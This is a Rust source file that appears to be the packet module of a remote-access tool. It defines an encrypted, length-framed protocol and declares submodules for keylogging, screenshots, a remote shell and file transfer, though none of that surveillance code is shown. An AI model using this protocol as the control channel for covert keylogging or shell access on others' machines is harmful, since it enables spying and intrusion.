pub mod aes;
pub mod filetransfer;
pub mod keylog;
pub mod listdir;
pub mod message;
pub mod rsa;
pub mod screenshot;
pub mod shell;

use crate::network::crypt;
use crate::network::crypt::KeyChain;
use serde::de::DeserializeOwned;
use serde::{Deserialize, Serialize};
use std::any::Any;
use std::fmt::Debug;
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::sync::Mutex;
use tokio_util::sync::CancellationToken;

#[derive(Debug, Copy, Clone, Serialize, Deserialize)]
pub enum PacketEncryption {
    Plain,
    AES,
    RSA,
}

#[derive(Debug, Copy, Clone)]
pub struct PacketHeader {
    pub size: u32,
    pub magic: [u8; 4],
    pub version: u8,
    pub encryption: PacketEncryption,
}

impl PacketHeader {
    pub fn new(size: u32, encryption: PacketEncryption) -> Self {
        Self {
            size,
            magic: [0x43, 0x4F, 0x54, 0x52], // "COTR"
            version: 1,
            encryption,
        }
    }
    pub fn to_vec(&self) -> Result<Vec<u8>, String> {
        let mut buffer = Vec::with_capacity(PACKET_HEADER_SIZE);
        buffer.extend_from_slice(&self.size.to_le_bytes());
        buffer.extend_from_slice(&self.magic);
        buffer.push(self.version);
        buffer.push(self.encryption as u8);
        Ok(buffer)
    }
    pub fn from_vec(data: &[u8]) -> Result<PacketHeader, String> {
        if data.len() != PACKET_HEADER_SIZE {
            return Err("Data too short for PacketHeader".to_string());
        }
        let size = u32::from_le_bytes(data[0..4].try_into().unwrap());
        let magic = data[4..8].try_into().unwrap();
        let version = data[8];
        let encryption = match data[9] {
            0 => PacketEncryption::Plain,
            1 => PacketEncryption::AES,
            2 => PacketEncryption::RSA,
            _ => return Err("Unknown encryption type".to_string()),
        };
        Ok(PacketHeader {
            size,
            magic,
            version,
            encryption,
        })
    }
}

static PACKET_HEADER_SIZE: usize = 10;

#[derive(Debug, Clone)]
pub struct NetworkPacket {
    pub header: PacketHeader,
    pub data: Vec<u8>,
}

impl NetworkPacket {
    pub async fn from_stream<R: AsyncReadExt + Unpin>(
        stream: &mut R,
    ) -> Result<NetworkPacket, String> {
        let mut header_bytes = vec![0u8; PACKET_HEADER_SIZE];
        stream
            .read_exact(&mut header_bytes)
            .await
            .map_err(|_| "Failed to read packet header".to_string())?;
        let header = PacketHeader::from_vec(&header_bytes)?;
        let mut data_bytes = vec![0u8; header.size as usize];
        stream
            .read_exact(&mut data_bytes)
            .await
            .map_err(|err| format!("Failed to read packet data: {}", err))?;
        Ok(NetworkPacket {
            header,
            data: data_bytes,
        })
    }

    pub async fn from_stream_with_cancel<R: AsyncReadExt + Unpin>(
        stream: Arc<Mutex<R>>,
        cancel_token: CancellationToken,
    ) -> Result<NetworkPacket, String> {
        async fn read_exact_with_cancel<R: AsyncReadExt + Unpin>(
            stream: &Arc<Mutex<R>>,
            buf: &mut [u8],
            cancel_token: &CancellationToken,
        ) -> Result<(), String> {
            let mut read = 0;
            while read < buf.len() {
                tokio::select! {
                    n = async {
                        let mut guard = stream.lock().await;
                        guard.read(&mut buf[read..]).await
                    } => {
                        match n {
                            Ok(0) => return Err("EOF reached".to_string()),
                            Ok(n) => read += n,
                            Err(e) => return Err(format!("Read error: {e}")),
                        }
                    }
                    _ = cancel_token.cancelled() => {
                        return Err("Packet reading cancelled".to_string());
                    }
                }
            }
            Ok(())
        }

        let mut header_bytes = vec![0u8; PACKET_HEADER_SIZE];
        read_exact_with_cancel(&stream, &mut header_bytes, &cancel_token).await?;
        let header = PacketHeader::from_vec(&header_bytes)?;
        let mut data_bytes = vec![0u8; header.size as usize];
        read_exact_with_cancel(&stream, &mut data_bytes, &cancel_token).await?;
        Ok(NetworkPacket {
            header,
            data: data_bytes,
        })
    }

    pub async fn send<W: AsyncWriteExt + Unpin>(&self, stream: &mut W) -> Result<(), String> {
        let mut send_buffer = Vec::with_capacity(PACKET_HEADER_SIZE + self.data.len());
        let header_bytes = self
            .header
            .to_vec()
            .map_err(|_| "Failed to serialize packet header".to_string())?;
        send_buffer.extend_from_slice(&header_bytes);
        send_buffer.extend_from_slice(&self.data);
        stream
            .write_all(&send_buffer)
            .await
            .map_err(|_| "Failed to send packet".to_string())?;
        Ok(())
    }

    pub fn new_plain(packet_data: &impl EncodablePacket) -> Result<NetworkPacket, String> {
        packet_data
            .plain_encode()
            .map_err(|_| "Failed to encrypt packet with plain encoding".to_string())
    }

    pub fn new_aes(
        packet_data: &impl EncodablePacket,
        key_chain: &KeyChain,
    ) -> Result<NetworkPacket, String> {
        packet_data
            .aes_encode(
                key_chain
                    .aes_key
                    .as_ref()
                    .ok_or("AES key not found in key chain")?,
            )
            .map_err(|_| "Failed to encrypt packet with AES".to_string())
    }

    pub fn new_rsa(
        packet_data: &impl EncodablePacket,
        key_chain: &KeyChain,
    ) -> Result<NetworkPacket, String> {
        packet_data
            .rsa_encode(
                key_chain
                    .rsa_public_key
                    .as_ref()
                    .ok_or("RSA public key not found in key chain")?,
            )
            .map_err(|_| "Failed to encrypt packet with RSA".to_string())
    }

    pub fn new(
        packet_data: &impl EncodablePacket,
        encryption: &PacketEncryption,
        key_chain: &KeyChain,
    ) -> Result<NetworkPacket, String> {
        match encryption {
            PacketEncryption::Plain => Self::new_plain(packet_data),
            PacketEncryption::AES => Self::new_aes(packet_data, key_chain),
            PacketEncryption::RSA => Self::new_rsa(packet_data, key_chain),
        }
    }

    pub fn decrypt(&self, key_chain: &KeyChain) -> Result<Box<dyn AnyPacketData>, String> {
        let data = &self.data;
        let packet: Box<dyn AnyPacketData> = match self.header.encryption {
            PacketEncryption::Plain => rmp_serde::from_slice(data)
                .map_err(|err| format!("Failed to decode plain packet data: {}", err))?,
            PacketEncryption::AES => match key_chain.aes_key {
                Some(aes_key) => {
                    let decrypted_data = aes_key
                        .decrypt(&self.data)
                        .map_err(|_| "Failed to decrypt AES packet data".to_string())?;
                    rmp_serde::from_slice(decrypted_data.as_slice())
                        .map_err(|_| "Failed to decode AES packet data".to_string())?
                }
                None => {
                    return Err("AES key not found in key chain".to_string());
                }
            },
            PacketEncryption::RSA => match &key_chain.rsa_private_key {
                Some(rsa_private_key) => {
                    let decrypted_data = rsa_private_key
                        .decrypt(&self.data)
                        .map_err(|_| "Failed to decrypt RSA packet data".to_string())?;
                    rmp_serde::from_slice(decrypted_data.as_slice())
                        .map_err(|_| "Failed to decode RSA packet data".to_string())?
                }
                None => {
                    return Err("RSA private key not found in key chain".to_string());
                }
            },
        };
        Ok(packet)
    }
}

#[typetag::serde(tag = "type")]
pub trait AnyPacketData: Any + Send + Sync + Debug {
    fn as_any(&self) -> &dyn Any;
    fn as_any_box(self: Box<Self>) -> Box<dyn Any + Send + Sync>;
}

pub trait EncodablePacket: AnyPacketData + Serialize + DeserializeOwned + Send + Sync {
    fn bin_serialize(&self) -> Result<Vec<u8>, String>;
    fn plain_encode(&self) -> Result<NetworkPacket, String>;
    fn aes_encode(&self, aeskey: &crypt::aes::AESKey) -> Result<NetworkPacket, &'static str>;
    fn rsa_encode(&self, rsakey: &crypt::rsa::RSAPublicKey) -> Result<NetworkPacket, String>;
}
impl<T: AnyPacketData + Serialize + DeserializeOwned + Send + Sync> EncodablePacket for T {
    fn bin_serialize(&self) -> Result<Vec<u8>, String> {
        let data: &dyn AnyPacketData = self;
        rmp_serde::to_vec(data).map_err(|_| "Failed to serialize packet data".to_string())
    }

    fn plain_encode(&self) -> Result<NetworkPacket, String> {
        let data = self.bin_serialize()?;
        let header = PacketHeader::new(data.len() as u32, PacketEncryption::Plain);
        Ok(NetworkPacket { header, data })
    }

    fn aes_encode(&self, aeskey: &crypt::aes::AESKey) -> Result<NetworkPacket, &'static str> {
        let encoded_data = self
            .bin_serialize()
            .map_err(|_| "Failed to encode packet")?;
        let encrypted_data = aeskey
            .encrypt(&encoded_data)
            .map_err(|_| "Encryption failed")?;
        let header = PacketHeader::new(encrypted_data.len() as u32, PacketEncryption::AES);
        Ok(NetworkPacket {
            header,
            data: encrypted_data,
        })
    }

    fn rsa_encode(&self, rsakey: &crypt::rsa::RSAPublicKey) -> Result<NetworkPacket, String> {
        let encoded_data = self
            .bin_serialize()
            .map_err(|_| "Failed to encode packet")?;
        let encrypted_data = rsakey
            .encrypt(&encoded_data)
            .map_err(|_| "Encryption failed")?;
        let header = PacketHeader::new(encrypted_data.len() as u32, PacketEncryption::RSA);
        Ok(NetworkPacket {
            header,
            data: encrypted_data,
        })
    }
}
